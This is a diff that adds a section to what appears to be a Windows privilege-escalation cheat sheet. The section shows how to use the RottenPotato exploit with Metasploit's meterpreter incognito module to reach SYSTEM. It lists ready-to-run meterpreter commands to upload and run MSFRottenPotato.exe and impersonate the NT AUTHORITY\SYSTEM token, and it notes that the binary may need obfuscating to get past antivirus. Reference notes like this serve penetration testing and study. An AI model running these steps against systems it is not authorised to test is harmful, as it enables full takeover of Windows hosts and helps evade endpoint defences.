@@ -89,3 +89,30 @@ The following tokens can be exploited to gain SYSTEM access privileges:
 - SeLoadDriverPrivilege
 - SeTakeOwnershipPrivilege
 - SeDebugPrivilege
+
+###### Rotten Potato w/ Metasploit
+
+RottenPotato can be used in combination with the Metasploit meterpreter
+incognito module to abuse the privileges above in order to elevate privilege to
+SYSTEM.
+
+Source: https://github.com/breenmachine/RottenPotatoNG
+
+```bash
+# Load the incognito module to toy with tokens
+meterpreter > load incognito
+
+# Upload the MSFRottenPotato binary on the target
+# Some obfuscation may be needed in order to bypass AV
+meterpreter > upload MSFRottenPotato.exe .
+
+# The command may need to be run a few times
+meterpreter > execute -f 'MSFRottenPotato.exe'
+
+# The NT AUTHORITY\SYSTEM token should be available as a delegation token
+# Even if the token is not displayed it might be available and the impersonation should be tried anyway
+meterpreter > list_tokens -u
+meterpreter > impersonate 'NT AUTHORITY\SYSTEM'
+```
+
+###### LonelyPottato (RottenPotato w/o Metasploit)
